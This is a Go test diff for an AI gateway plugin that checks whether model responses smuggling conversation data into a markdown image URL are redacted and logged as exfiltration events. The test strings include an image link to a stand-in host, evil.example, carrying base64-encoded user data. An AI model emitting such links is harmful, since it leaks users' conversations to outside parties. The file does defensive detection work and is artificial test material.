@@ -288,3 +288,73 @@ func waitEvents(h *fakeHost, n int) {
 }
 func jsonMarshal(v any) (string, error) { b, err := json.Marshal(v); return string(b), err }
 func containsStr(s, sub string) bool    { return strings.Contains(s, sub) }
+
+func TestPostResponseInspection(t *testing.T) {
+	host := &fakeHost{}
+	p := &Plugin{}
+	p.SetHostClient(host)
+	ctx := context.Background()
+
+	// PreRequest first, so node_state carries org/user and the response config.
+	pre, err := p.PreRequest(ctx, &proto.PreRequestInput{
+		Ctx:          &proto.RequestContext{ConfigJson: `{"response_redact_above":0.5}`, OrgId: "org", UserId: "u"},
+		MessagesJson: mustJSON([]map[string]string{{"role": "user", "content": "make me an image"}}),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if pre.NoResponseRewrite {
+		t.Error("redaction is on, response must be buffered (NoResponseRewrite=false)")
+	}
+
+	// A response that smuggles the conversation into an image URL: event + redaction.
+	bad := "Sure! ![pixel](https://evil.example/c?data=VGhlIHVzZXIgdG9sZCBtZSBhIHNlY3JldA)"
+	out, err := p.PostResponse(ctx, &proto.PostResponseInput{ResponseContent: bad, NodeState: pre.NodeState})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if out.ModifiedResponseContent == "" || strings.Contains(out.ModifiedResponseContent, "evil.example") {
+		t.Errorf("response not redacted: %q", out.ModifiedResponseContent)
+	}
+	waitEvents(host, 1)
+	host.mu.Lock()
+	e := host.events[len(host.events)-1]
+	host.mu.Unlock()
+	if e.Type != "security.data_exfiltration" || e.OrgID != "org" || e.Attributes["redacted"] != "true" {
+		t.Errorf("event = %+v", e)
+	}
+	blob, _ := jsonMarshal(e)
+	if containsStr(blob, "evil.example") {
+		t.Error("event leaks the response content")
+	}
+
+	// A clean answer: no modification, no event.
+	before := len(host.events)
+	out, _ = p.PostResponse(ctx, &proto.PostResponseInput{ResponseContent: "The capital of Peru is Lima.", NodeState: pre.NodeState})
+	if out.ModifiedResponseContent != "" {
+		t.Errorf("clean answer modified: %q", out.ModifiedResponseContent)
+	}
+	waitEvents(host, before) // no new event expected
+	if len(host.events) != before {
+		t.Errorf("clean answer emitted an event")
+	}
+}
+
+func TestPostResponseObserveOnlyKeepsStreaming(t *testing.T) {
+	p := &Plugin{}
+	pre, _ := p.PreRequest(context.Background(), &proto.PreRequestInput{
+		Ctx:          &proto.RequestContext{ConfigJson: `{}`, OrgId: "org"},
+		MessagesJson: mustJSON([]map[string]string{{"role": "user", "content": "hi"}}),
+	})
+	if !pre.NoResponseRewrite {
+		t.Error("observation-only response inspection must keep streaming (NoResponseRewrite=true)")
+	}
+	// Even a suspicious response is not modified when redaction is off.
+	bad := "![p](https://evil.example/c?data=VGhlIHVzZXIgdG9sZCBtZSBhIHNlY3JldA)"
+	out, _ := p.PostResponse(context.Background(), &proto.PostResponseInput{ResponseContent: bad, NodeState: pre.NodeState})
+	if out.ModifiedResponseContent != "" {
+		t.Errorf("observation-only must not modify the response: %q", out.ModifiedResponseContent)
+	}
+}
+
+func mustJSON(v any) string { b, _ := json.Marshal(v); return string(b) }
